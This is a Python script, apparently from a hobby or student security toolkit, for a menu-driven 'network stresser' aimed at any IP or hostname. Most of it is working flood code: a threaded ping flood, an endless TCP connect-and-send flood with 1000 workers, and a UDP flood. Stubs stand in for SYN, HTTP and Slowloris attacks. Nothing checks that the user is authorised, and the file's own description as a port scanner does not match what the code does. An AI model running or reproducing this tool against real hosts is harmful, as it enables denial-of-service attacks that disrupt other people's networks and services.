# This script will be a network stress testing tool. 
# The tool will provide the user the ability to choose a target by either IP or Hostname ("example.com")
# The tool should be a menu based system, but with custom commands that can be typed instead of using numerical menu system.


#=====================#
# Linking to project. #
#=====================#

tool_details = {
    "name":"Stress Tester",
    "filename":"network_stresser.py",
    "Category":"Network", 
    "Version":"1.0",
    "Description":"This will scan a target to check if ports are open."
}


#=========#
# Imports #
#=========#

from internal_library.asset_functions import beautify, beautify_string, beautify_title,resolve_hostname, get_os, clear_screen as clear_screen, menu_option, sanitize_target_input
import socket
import os
import threading
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import subprocess
import time

#==================#
# Global Variables #
#==================#
target = ""
target_ip = ""
target_hostname = ""
target_port = 80
attack = ""

# Global Varaibles for Tracking
packets_sent = 0
packets_received = 0
packets_lost = 0

#==================#
# Attack Functions #
#==================#


#|> Ping Attack <|#
def ping_target(target_ip):
    """Function to ping the target IP once and record the outcome."""
    global packets_sent, packets_received, packets_lost
    
    packets_sent += 1

    # Check the operating system and set the correct ping command
    if get_os() == "Windows":
        # For Windows, the count flag is -n
        response = subprocess.run(["ping", "-n", "1", target_ip], capture_output=True, text=True)
    else:
        # For Unix-like systems (Linux, macOS), the count flag is -c
        response = subprocess.run(["ping", "-c", "1", target_ip], capture_output=True, text=True)
        
    if response.returncode == 0:
        packets_received += 1
    else:
        packets_lost += 1

def ping_attack(target_ip, number_of_pings=4):
    """Conduct a pinging attack using concurrent futures for parallel execution."""
    global packets_sent, packets_received, packets_lost
    
    # Reset packet tracking
    packets_sent = 0
    packets_received = 0
    packets_lost = 0
    
    print(f"Pinging {target_ip} with 32 bytes of data:")
    
    # Use ThreadPoolExecutor to ping in parallel
    with ThreadPoolExecutor(max_workers=number_of_pings) as executor:
        futures = [executor.submit(ping_target, target_ip) for _ in range(number_of_pings)]
        # Wait for all futures to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                # Results are not used directly as the global counters are updated by each function call
                future.result()
            except Exception as exc:
                print(f"Generated an exception: {exc}")
    
    # Print the summary of the attack
    print(f"Packets: Sent = {packets_sent}, Received = {packets_received}, Lost = {packets_lost}")


#======================#
#|> TCP Flood Attack <|#
#======================#

def tcp_flood(target_ip, target_port,  message="Hello"):
    """Function to send TCP packets to the target IP and port."""
    global packets_sent
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            # Connect to server and send data
            sock.connect((target_ip, target_port))
            sock.sendall(bytes(message, "utf-8"))
            packets_sent += 1
    except Exception as e:
        # Print the error message | Should add graceful exit here. <!!> | It is common for errors to occur in network attacks or if firewalls are in place.
        print(f"Error: {e}")

def tcp_flood_attack(target_ip, target_port, number_of_packets=0, message="Hello"):
    """Conduct a TCP flood attack continuously until stopped manually."""
    global packets_sent
    
    print(f"Continuously TCP Flooding {target_ip}:{target_port} with custom message... Press CTRL+C to stop.")

    # Reset packet tracking
    packets_sent = 0
    if number_of_packets == 0:
        # Infinite loop
        try:
            while True:
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
                    futures = [executor.submit(tcp_flood, target_ip, target_port, message) for _ in range(1)]
                    # Wait for all futures to complete
                    for future in concurrent.futures.as_completed(futures):
                        pass
                # If threading or concurrent execution is desired, it could be added here
                #tcp_flood(target_ip, target_port)
                # Optional: Print the number of packets sent every N packets for feedback without overwhelming the console
                #if packets_sent % 100 == 0:
                #   print(f"Packets Sent: {packets_sent}")

                # A small delay can be added to avoid overwhelming the network, comment out if unnecessary
                # time.sleep(0.01)
        except KeyboardInterrupt:
            # When the user stops the attack manually
            print(f"\nAttack stopped. Total Packets Sent: {packets_sent}")
    else:
        try:
            # Use ThreadPoolExecutor to send packets in parallel
            with concurrent.futures.ThreadPoolExecutor(max_workers=number_of_packets) as executor:
                futures = [executor.submit(tcp_flood, target_ip, target_port) for _ in range(number_of_packets)]
                # Wait for all futures to complete
                for future in concurrent.futures.as_completed(futures):
                    pass
        except KeyboardInterrupt:
            # When the user stops the attack manually
            print(f"\nAttack stopped. Total Packets Sent: {packets_sent}")
            
    # Print the summary of the attack
    print(f"Packets Sent: {packets_sent}")
    
    
    
def syn_flood_attack(): # Because of restrictions on project scope, this feature is not yet implemented as it requires packet manipulation.
    global target_ip
    print("SYN Flooding " + target_ip + " on port " + str(target_port) + "...")
    print("This feature is not yet implemented.")

#======================#
#|> UDP Flood Attack <|#
#======================#
def udp_flood(target_ip, target_port, message="Hello", number_of_packets=0):
    """Function to send UDP packets to the target IP and port."""
    global packets_sent
    print(f"Initiating UDP Flood Attack on {target_ip}:{target_port}... Press CTRL+C to stop.")

    # Reset packet tracking
    packets_sent = 0

    # Define the stop condition for the infinite loop
    stop_attack = False
    while stop_attack == False:
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
                futures = []
                for _ in range(number_of_packets or 1):  # Ensure at least one packet is sent if number_of_packets is 0
                    if stop_attack:
                        break
                    futures.append(executor.submit(send_udp_packet, target_ip, target_port, message))

                # If number_of_packets is 0, run indefinitely
                while number_of_packets == 0 and not stop_attack:
                    futures.append(executor.submit(send_udp_packet, target_ip, target_port, message))

                # Wait for all futures to complete if a specific number of packets is set
                if number_of_packets:
                    concurrent.futures.wait(futures)

        except KeyboardInterrupt:
            stop_attack = True
            print(f"\nAttack stopped by user. Total Packets Sent: {packets_sent}")

def send_udp_packet(target_ip, target_port, message):
    """Helper function to send a single UDP packet."""
    global packets_sent
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(message, "utf-8"), (target_ip, target_port))
        packets_sent += 1
    except Exception as e:
        print(f"Error sending UDP packet: {e}")
    finally:
        sock.close()
        
        
        
        
#=======================#
#|> HTTP Flood Attack <|#
#=======================#
    
def http_flood_attack():
    global target_ip
    print("HTTP Flooding " + target_ip + " on port " + str(target_port) + "...")
    print("This feature is not yet implemented.")

#======================#
#|> Slowloris Attack <|#
#======================#
    
def slowloris_attack():
    global target_ip
    print("Slowloris attacking " + target_ip + " on port " + str(target_port) + "...")
    print("This feature is not yet implemented.")
    
    
def stop_attack(): # This function is not yet implemented.
    global attack
    attack = ""
    print("Stopping attack...")


#===================#
# Testing Functions #
#===================#

def is_target_valid():
    get_target = input("Enter the IP or Hostname of the target: \n>> ")
    target_ip = sanitize_target_input(get_target)
    print(f"Target: {target_ip}")
    return target_ip


#=================#
# Option Function #
#=================#
def menu_stresser_options():
    # Options
    tcp_floot_option = menu_option(1, "TCP Flood Attack")
    syn_flood_option = menu_option(2, "SYN Flood Attack")
    udp_flood_option = menu_option(3, "UDP Flood Attack")
    http_flood_option = menu_option(4, "HTTP Flood Attack")
    slowloris_option = menu_option(5, "Slowloris Attack")
    
    options = f"{tcp_floot_option}{syn_flood_option}{udp_flood_option}{http_flood_option}{slowloris_option}"
    return options
    
#=================#
#  Main Function  #
#=================#
def main():
    packets = 1000
    clear_screen()
    
    stresser_menu_title = beautify_title("Network Stresser", "=", 5)
    options = menu_stresser_options()

    print(f"""{stresser_menu_title}
Welcome to the Network Stresser.
This tool will allow you to stress test a network by conducting various attacks on a target.
          
          """)
    print(f"{options}")
    attack_choice = input(">> ")
    
    if attack_choice == "1": # TCP Flood Attack |MENU OPTION|
        target_ip = is_target_valid()
        
        # Ask for the port number
        target_port = input("Enter the port number: \n>> ")
        if target_port == "":
            target_port = 80
        else:
            target_port = int(target_port)
        
        tcp_flood_attack(target_ip, target_port)
        
    elif "tcp:" in attack_choice: # TCP Flood Attack |COMMAND| Default port is 80 and packets is 0. | Command: tcp:<ip> |
        attack_choice = attack_choice.split(":")
        target_ip = attack_choice[1]
        tcp_flood_attack(target_ip, 80)
        
        
    elif attack_choice == "2": # SYN Flood Attack
        target_ip = is_target_valid()
        syn_flood_attack()
    elif attack_choice == "3": # UDP Flood Attack
        target_ip = is_target_valid()
        udp_flood(target_ip, 80, "Hello", packets) # NEEDS TO BE TESTED
    elif attack_choice == "4": # HTTP Flood Attack
        target_ip = is_target_valid()
        http_flood_attack()
    elif attack_choice == "5": # Slowloris Attack
        target_ip = is_target_valid()
        slowloris_attack()
    else:
        print("Invalid option. Please try again.")
    
    input("Press Enter to Continue...")
    
    target_ip = is_target_valid()
    tcp_flood_attack(target_ip, 80)

if __name__ == "__main__":
    while True:
        clear_screen()
        main()